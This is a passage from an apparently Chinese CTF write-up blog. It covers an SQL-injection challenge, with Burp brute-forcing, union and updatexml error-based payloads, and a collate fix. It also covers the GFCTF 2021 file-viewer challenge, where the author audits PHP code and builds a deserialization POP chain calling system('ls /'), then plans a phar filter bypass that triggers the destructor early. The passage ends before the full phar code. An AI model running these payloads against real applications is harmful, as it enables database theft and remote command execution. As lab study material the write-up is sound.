output_txt)<br></code></pre></td></tr></tbody></table></figure>
<p>效果如下：</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314183312073.png" alt="image-20240314183312073"></p>
<p>接着bp抓包进行爆破，而想到爆破的原因在于这下图，可以看到显示出来的是成绩，而不是什么敏感信息，这里我也是猜测，如果都爆破一遍，一定有一个学生的结果会不一样。结果也告诉我，我的思路是正确的</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314183343645.png" alt="image-20240314183343645"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314183433797.png" alt="image-20240314183433797"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314183440690.png" alt="image-20240314183440690"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314183457120.png" alt="image-20240314183457120"></p>
<p>爆破完之后查看长度，发现有flag泄露。但事后看了wp发现还可以用常规的联合注入得到，并且其中的姿势我也是第一次见到（当然也可以采用报错注入）这里就学习一下联合注入了</p>
<h2 id="联合注入">联合注入</h2>
<p>首先常规联合注入发现存在5列数据，接下来的联合注入就出问题了</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">name=<span class="hljs-number">1</span>&amp;password=<span class="hljs-number">1</span>&amp;student_id=<span class="hljs-number">1</span>" union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>--+<br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314185849430.png" alt="image-20240314185849430"></p>
<p>可以看到页面并没有显示出回显位，这里我也没见过这种情况，看了师傅解释是这样的</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">问题来了，当我按正常联合注入流程测的时候发现它说查无此人或密码错误，我们输入的name是<span class="hljs-number">1</span>，联合注入查到的数据是<span class="hljs-number">1</span>，<span class="hljs-number">2</span>，<span class="hljs-number">3</span>，<span class="hljs-number">4</span>，<span class="hljs-number">5</span><br>从前端显示的结果来看很显然name并不是第一个字段，不断测试，测出name字段位<br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314190750425.png" alt="image-20240314190750425"></p>
<p>当把第二个字段设为1的时候就判断正确了，说明第二个字段是name，然后回显的成绩是5，说明第五个字段是成绩</p>
<p>由此可以判断后端的处理逻辑</p>
<blockquote>
<p>（mysql查完数据后取查到数据的name字段值和用户输入的name值进行判断，如果name判断成功，然后回显<br>
这里用联合注入使查到的name值为1，我们前端输入的name值也是1，两者相等，就判断成功了）</p>
</blockquote>
<p>这里常规查库，当查到表名的时候又出现问题了</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314190933860.png" alt="image-20240314190933860"></p>
<p>报错显示字符集不匹配，那就让它匹配，collate 子句将字符集转换为一致的形式，一般字符集的话都是utf8</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">name=<span class="hljs-number">1</span>&amp;password=<span class="hljs-number">1</span>&amp;student_id=<span class="hljs-number">1</span>" union select <span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-built_in">group_concat</span>(table_name)collate utf8_general_ci from information_schema<span class="hljs-selector-class">.tables</span> where table_schema=<span class="hljs-built_in">database</span>()--+<br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314191047978.png" alt="image-20240314191047978"></p>
<p>发现成功，之后就是常规思路了，不赘述了</p>
<h2 id="报错注入">报错注入</h2>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">name=<span class="hljs-number">1</span>&amp;password=<span class="hljs-number">1</span>&amp;student_id=<span class="hljs-number">1</span>"and <span class="hljs-built_in">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(database()),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)--+<br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314184826656.png" alt="image-20240314184826656"></p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">name=<span class="hljs-number">1</span>&amp;password=<span class="hljs-number">1</span>&amp;student_id=<span class="hljs-number">1</span>"and <span class="hljs-built_in">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select group_concat(table_name)from information_schema<span class="hljs-selector-class">.tables</span> where table_schema=<span class="hljs-built_in">database</span>()),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)--+<br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314184936138.png" alt="image-20240314184936138"></p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">name=<span class="hljs-number">1</span>&amp;password=<span class="hljs-number">1</span>&amp;student_id=<span class="hljs-number">1</span>"and <span class="hljs-built_in">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select group_concat(column_name)from information_schema<span class="hljs-selector-class">.columns</span> where table_name='students'),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)--+<br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314185055756.png" alt="image-20240314185055756"></p>
<p>到了这里就会尴尬掉，因为找了所有的列都没有flag，这里看师傅如何解释的</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">应该是查到的数据太多了，没有全部回显出来，然后回显出来的数据中也没有flag。<br>出题人应该是把flag放在表的最后了，冷静，冷静，flag是很长的，因此我们只需要找到某一列最大的那个数据就可以了，这里用MAX函数获取指定列中的最大值<br></code></pre></td></tr></tbody></table></figure>
<p>这样的话就可以这样构造，至于完整回显，用mid、substr都可，不再赘述</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">name=<span class="hljs-number">1</span>&amp;password=<span class="hljs-number">1</span>&amp;student_id=<span class="hljs-number">1</span>"and <span class="hljs-built_in">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select MAX(grade)from students),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)--+<br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314185404845.png" alt="image-20240314185404845"></p>
<h1>[GFCTF 2021]文件查看器</h1>
<p>给出一个登录页面，直接尝试弱密码admin:admin登录成功，之后是一个文件查看器。我们直接查看相关文件，审计代码</p>
<p>index.php</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs scss">&lt;?php<br>    function <span class="hljs-built_in">__autoload</span>($className) {<br>        <span class="hljs-built_in">include</span>("class/".$className.".class.php");<br>    }<br><br>    <span class="hljs-built_in">if</span>(!isset($_GET['c'])){<br>        <span class="hljs-selector-tag">header</span>("location:./?c=User&amp;m=login");<br>    }else{<br>        <span class="hljs-variable">$c</span>=$_GET<span class="hljs-selector-attr">[<span class="hljs-string">'c'</span>]</span>;<br>        <span class="hljs-variable">$class</span>=new <span class="hljs-variable">$c</span>();<br>        <span class="hljs-built_in">if</span>(isset($_GET['m'])){<br>            <span class="hljs-variable">$m</span>=$_GET<span class="hljs-selector-attr">[<span class="hljs-string">'m'</span>]</span>;<br>            <span class="hljs-variable">$class</span>-&gt;<span class="hljs-variable">$m</span>();<br>        }<br>    }<br></code></pre></td></tr></tbody></table></figure>
<p>弄了半天，扫了目录发现源码都在www.zip上。。。</p>
<p>Myerror.class.php</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Myerror</span></span>{<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$message</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{<br>            <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">'error_log'</span>,<span class="hljs-string">'/var/www/html/log/error.txt'</span>);<br>            <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">'log_errors'</span>,<span class="hljs-number">1</span>);<br>        }<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>{<br>            <span class="hljs-variable">$test</span>=<span class="hljs-variable language_">$this</span>-&gt;message-&gt;{<span class="hljs-variable language_">$this</span>-&gt;test};<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">"test"</span>;<br>        }<br>    }<br></code></pre></td></tr></tbody></table></figure>
<p>User.class.php</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>{<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>{<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">"view/login.html"</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'username'</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'password'</span>])){<br>                <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'username'</span>];<br>                <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'password'</span>];<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">check</span>()){<br>                    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"location:./?c=Files&amp;m=read"</span>);<br>                }<br>            }<br>        }<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"></span>)</span>{<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-string">"admin"</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-string">"admin"</span>){<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            }<span class="hljs-keyword">else</span>{<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">"<span class="hljs-subst">{$this-&gt;username}</span>的密码不正确或不存在该用户"</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            }<br>        }<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>{<br>            (@<span class="hljs-variable language_">$this</span>-&gt;password)();<br>        }<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$arg</span></span>)</span>{ <br>            (<span class="hljs-variable">$name</span>)();<br>        }<br>    }<br></code></pre></td></tr></tbody></table></figure>
<p>Files.class.php</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Files</span></span>{<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>();<br>        }<br>        <br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>)</span>{<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">"view/file.html"</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'file'</span>])){<br>                <span class="hljs-variable language_">$this</span>-&gt;filename=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'file'</span>];<br>            }<span class="hljs-keyword">else</span>{<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">"请输入文件名"</span>);<br>            }<br>            <span class="hljs-variable">$contents</span>=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getFile</span>();<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;br&gt;&lt;textarea class="file_content" type="text" value='</span>.<span class="hljs-string">"&lt;br&gt;"</span>.<span class="hljs-variable">$contents</span>;<br>        }<br>        <br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"></span>)</span>{<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/^\/|phar|flag|data|zip|utf16|utf-16|\.\.\//i'</span>,<span class="hljs-variable">$this</span>-&gt;filename)){<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">"这合理吗"</span>;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">"这不合理"</span>);<br>            }<br>        }<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFile</span>(<span class="hljs-params"></span>)</span>{<br>            <span class="hljs-variable">$contents</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter</span>();<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'write'</span>])){<br>                <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename,<span class="hljs-variable">$contents</span>);<br>            }<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$contents</span>)){<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>;<br>            }<span class="hljs-keyword">else</span>{<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">"该文件不存在或者内容为空"</span>);<br>            } <br>        }<br><br>         <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params"></span>)</span>{<br>            <span class="hljs-variable">$log</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Myerror</span>();<br>        }<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>{<br>            (<span class="hljs-variable">$key</span>)(<span class="hljs-variable language_">$this</span>-&gt;arg);<br>        }<br>    }<br></code></pre></td></tr></tbody></table></figure>
<p>除了File这个类文件，上述几个就是来处理错误和用户登录的</p>
<p><code>UserClass.__destruct-》UserClass.check-》MyerrorClass.__toString-》FilesClass.__get</code></p>
<p>这里我先直接写出最终的链子</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Myerror</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$message</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>}<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>}<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Files</span></span><br><span class="hljs-class"></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>{<br>        (<span class="hljs-variable">$key</span>)(<span class="hljs-variable language_">$this</span>-&gt;arg);<br>    }<br>}<br><span class="hljs-variable">$pop</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><span class="hljs-variable">$pop1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><span class="hljs-variable">$pop</span>-&gt;password = [<span class="hljs-variable">$pop1</span>, <span class="hljs-string">'check'</span>];<br><span class="hljs-variable">$pop</span>-&gt;username = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myerror</span>();<br><span class="hljs-variable">$pop</span>-&gt;username-&gt;message = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Files</span>();<br><span class="hljs-variable">$pop</span>-&gt;username-&gt;test = <span class="hljs-string">'system'</span>;<br><span class="hljs-variable">$pop</span>-&gt;username-&gt;message-&gt;arg = <span class="hljs-string">'ls /'</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$pop</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>不过这个链子在调用check方法的时候会遇到点问题：</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss">在PHP中，当你在类的 __destruct 魔术方法中使用 <span class="hljs-built_in">check</span>() 的方式进行调用时，它与 <span class="hljs-variable">$this</span>-&gt;<span class="hljs-built_in">check</span>() 的调用方式并不相同。<br><br><span class="hljs-built_in">check</span>() 的方式是以函数的方式进行调用，而不是作为类的方法进行调用。这意味着它将被视为全局函数，而不是类的方法。这种方式可能会导致错误，因为在 __destruct 方法中无法直接调用全局函数。<br><br>如果你想在 __destruct 方法中调用类的方法，正确的方式是使用 <span class="hljs-variable">$this</span>-&gt;<span class="hljs-built_in">check</span>()。这将确保在类的上下文中调用 <span class="hljs-built_in">check</span>() 方法。<br></code></pre></td></tr></tbody></table></figure>
<p>也就是说下面这个代码，如果我们直接将password赋值为check的话，就是这样的：check()，而这种调用方式与$this-&gt;check()是不相同的。那我们想要调用check函数，这里就需要利用PHP某个特性了</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>{<br>            (@<span class="hljs-variable language_">$this</span>-&gt;password)();<br>        }<br></code></pre></td></tr></tbody></table></figure>
<p>解决办法就是利用PHP7引入的一个新特性 Uniform Variable Syntax,它扩展了可调用数组的功能,增加了其在变量上<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0&amp;spm=1001.2101.3001.7020">调用函数</a>的能力，使得可以在一个变量（或表达式）后面加上括号直接调用函数。<br>
可调用数组的构造我们简单测试下</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;check!!!"</span>;<br>    }<br>}<br><br><span class="hljs-variable">$a</span>=[<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>(),<span class="hljs-string">"check"</span>];<br><span class="hljs-variable">$a</span>();<br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314200523714.png" alt="image-20240314200523714"></p>
<p>后面基本就不会了，都是没见过的知识，首先这里我们先理一下思路，这里我们链子准备好了，就是要找反序列化的点，很明显没有unserialize，但是有file_get_contents，同时还有查看文件的功能。那很容易联想到phar反序列化，那我们看看假设我们可以上传链子了，会遇到什么问题</p>
<p>那我们上传了链子，肯定需要phar伪协议去读取相应的文件，但我们需要看一下代码执行逻辑，这里上传之后会调用到getFile函数，该函数含有filter会将我们的phar等关键字过滤掉，闹我们就得想办法绕过。</p>
<p>同时注意到filter的过滤函数是在file_get_contents反序列化入口点的后面，这充分暗示我们可以绕过，同时注意到User类中含有析构函数，这里就可以联想到PHP的GC垃圾回收机制，如果我们可以提前调用到析构函数，那就会完全按照我们理想的链子路线走下去，就不会被filter所过滤掉。至于如何提前调用已经学过很多次了，就不赘述了，放几篇好的文章参考即可。</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314202405761.png" alt="image-20240314202405761"></p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">O:<span class="hljs-number">4</span>:<span class="hljs-string">"User"</span>:<span class="hljs-number">2</span>:{s:<span class="hljs-number">8</span>:<span class="hljs-string">"username"</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">"Myerror"</span>:<span class="hljs-number">2</span>:{s:<span class="hljs-number">7</span>:<span class="hljs-string">"message"</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">"Files"</span>:<span class="hljs-number">2</span>:{s:<span class="hljs-number">8</span>:<span class="hljs-string">"filename"</span>;N;s:<span class="hljs-number">3</span>:<span class="hljs-string">"arg"</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"ls /"</span>;}s:<span class="hljs-number">4</span>:<span class="hljs-string">"test"</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">"system"</span>;}s:<span class="hljs-number">8</span>:<span class="hljs-string">"password"</span>;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">2</span>:{<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">"User"</span>:<span class="hljs-number">2</span>:{s:<span class="hljs-number">8</span>:<span class="hljs-string">"username"</span>;N;s:<span class="hljs-number">8</span>:<span class="hljs-string">"password"</span>;N;}<span class="hljs-selector-tag">i</span>:<span class="hljs-number">1</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">"check"</span>;}}<br></code></pre></td></tr></tbody></table></figure>
<p>我们的链子输出如下，我们可以通过修改对象指针索引来提前调用到析构函数，也就是改为下面的（i:0）</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">O:<span class="hljs-number">4</span>:<span class="hljs-string">"User"</span>:<span class="hljs-number">2</span>:{s:<span class="hljs-number">8</span>:<span class="hljs-string">"username"</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">"Myerror"</span>:<span class="hljs-number">2</span>:{s:<span class="hljs-number">7</span>:<span class="hljs-string">"message"</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">"Files"</span>:<span class="hljs-number">2</span>:{s:<span class="hljs-number">8</span>:<span class="hljs-string">"filename"</span>;N;s:<span class="hljs-number">3</span>:<span class="hljs-string">"arg"</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"ls /"</span>;}s:<span class="hljs-number">4</span>:<span class="hljs-string">"test"</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">"system"</span>;}s:<span class="hljs-number">8</span>:<span class="hljs-string">"password"</span>;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">2</span>:{<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">"User"</span>:<span class="hljs-number">2</span>:{s:<span class="hljs-number">8</span>:<span class="hljs-string">"username"</span>;N;s:<span class="hljs-number">8</span>:<span class="hljs-string">"password"</span>;N;}<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">"check"</span>;}}<br></code></pre></td></tr></tbody></table></figure>
<p>但是我们生成的phar文件，因此在经过010修改后还需要重新计算签名，完整pop如下</p>
